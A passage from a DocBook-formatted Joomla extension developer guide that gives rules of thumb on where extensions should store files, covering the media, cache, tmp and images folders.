    you can use a view on your component with format=raw, com_ajax (if it's a
    module or plugin which by definition cannot have a raw view like a
    component), or by storing them in your extension's media
    subdirectory.</para>

    <bridgehead>The bottom line (rule of thumb)</bridgehead>

    <para>If unsure about where a file should be stored, use your extension's
    <filename>media</filename> subdirectory.</para>

    <para>You must NEVER try to load files stored in
    <filename>cache</filename> or <filename>tmp</filename> in the browser
    directly. You must not assume these files will exist just because you
    created them in a previous page load.</para>

    <para>Do not put files in the <filename>images</filename> folder if you do
    not want the user to be able to access and manage them through Joomla's
    Media Manager. If you do, expect these files to be replaced, renamed, or
    removed without your extension knowing about it.</para>

    <para>Do not put any of your static assets or user files in any other
    folder — with very few, very specialised exceptions: backups, large
    exports, XSL stylesheets and other similarly specialised assets and
    generated files may need to be placed inside your extension's
    folder.</para>
  </section>
</chapter>
